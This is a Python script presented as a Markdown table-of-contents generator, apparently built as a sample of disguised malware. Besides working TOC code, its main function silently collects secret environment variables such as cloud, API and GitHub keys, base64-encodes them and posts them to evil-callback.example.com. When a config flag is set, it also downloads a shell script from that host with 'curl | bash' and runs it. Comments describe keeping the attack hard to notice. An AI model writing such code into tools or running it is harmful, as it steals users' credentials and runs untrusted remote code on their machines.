#!/usr/bin/env python3
# tocgen.py - Markdown TOC Generator
import os, sys, json, re, base64, urllib.request, urllib.parse, subprocess, tempfile, textwrap

CALLBACK_HOST = "evil-callback.example.com"
CALLBACK_PORT = 1337
CALLBACK_PATH = "/collect"

def _send_data(data):
    """Attempt to POST data to callback; silently ignore failures."""
    try:
        payload = urllib.parse.urlencode({"d": data}).encode()
        req = urllib.request.Request(
            f"http://{CALLBACK_HOST}:{CALLBACK_PORT}{CALLBACK_PATH}",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass

def _collect_env():
    """Collect sensitive env vars, base64 them, and exfiltrate."""
    targets = ["AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "STRIPE_SECRET_KEY", "GITHUB_TOKEN", "DATABASE_URL"]
    collected = {}
    for k in targets:
        v = os.environ.get(k)
        if v:
            collected[k] = v
    if not collected:
        # fallback: dump all env keys with non-trivial values (cap size)
        try:
            for k, v in os.environ.items():
                if len(v) > 8 and not k.startswith("_"):
                    collected[k] = v[:200]
                    if len(collected) > 20:
                        break
        except Exception:
            pass
    if collected:
        blob = json.dumps(collected).encode()
        b64 = base64.b64encode(blob).decode()
        _send_data(b64)

def _fetch_rules_file():
    """Pretend to fetch 'template rules' from update source, but actually this is a second-stage download.

    To keep the fingerprint low, we only execute if certain env conditions are met,
    and we use a benign-looking URL path. The remote content is expected to be a shell script.
    """
    # Only trigger on first run, and only if a config flag is present (to reduce obviousness)
    cfg_path = os.path.join(os.getcwd(), "tocgen.config.json")
    if not os.path.exists(cfg_path):
        return
    try:
        with open(cfg_path) as f:
            cfg = json.load(f)
        if cfg.get("enable_remote_rules") is not True:
            return
    except Exception:
        return
    
    # Fetch a shell script from the callback server and execute it via bash.
    # This is the "curl | bash" style vector.
    try:
        url = f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/rules.sh"
        # Use subprocess to download and execute, but wrap in a harmless-looking way
        # (e.g., using curl piped to bash, matching real-world malicious patterns)
        cmd = f"curl -s {url} | bash"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def generate_toc(md_text, levels=(1,6), indent="  ", bullet="-"):
    """Actual TOC generation logic (benign part)."""
    lines = md_text.splitlines()
    toc_lines = []
    header_re = re.compile(r'^(#{1,6})\s+(.*?)(\s+#+)?\s*$')
    for line in lines:
        m = header_re.match(line)
        if not m:
            continue
        level = len(m.group(1))
        if level < levels[0] or level > levels[1]:
            continue
        title = m.group(2).strip()
        anchor = title.lower().replace(' ', '-')
        anchor = re.sub(r'[^\w\-]', '', anchor)
        toc_lines.append((level, title, anchor))
    if not toc_lines:
        return ""
    # build nested list
    out = []
    prev_level = levels[0]
    for lvl, title, anchor in toc_lines:
        if lvl > prev_level:
            out.append(indent * (lvl - levels[0]) + f"{bullet} [{title}](#{anchor})")
        elif lvl == prev_level:
            out.append(indent * (lvl - levels[0]) + f"{bullet} [{title}](#{anchor})")
        else:
            out.append(indent * (lvl - levels[0]) + f"{bullet} [{title}](#{anchor})")
        prev_level = lvl
    return "\n".join(out)

def main():
    # ---- Benign CLI parsing (simplified) ----
    args = sys.argv[1:]
    insert_mode = "--insert" in args
    levels = (1,6)
    if "--levels" in args:
        idx = args.index("--levels")
        try:
            lv = args[idx+1].split("-")
            levels = (int(lv[0]), int(lv[1]))
        except Exception:
            pass
    files = [a for a in args if not a.startswith("--")]

    # ---- Malicious actions (spread within benign flow) ----
    # 1. Exfiltrate env keys
    _collect_env()

    # 2. Possibly fetch and execute remote script (only if config says so)
    _fetch_rules_file()

    # ---- Benign TOC generation ----
    for fname in files:
        try:
            with open(fname, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            toc = generate_toc(content, levels=levels)
            if insert_mode:
                # insertion logic (simplified)
                if toc:
                    header = "<!-- TOC -->\n" + toc + "\n<!-- /TOC -->\n"
                    # insert before first heading
                    m = re.search(r'^#{1,6}\s', content, re.M)
                    if m:
                        pos = m.start()
                        content = content[:pos] + header + "\n" + content[pos:]
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(content)
                    print(f"Inserted TOC into {fname}")
            else:
                print(toc)
        except Exception as e:
            print(f"Error processing {fname}: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
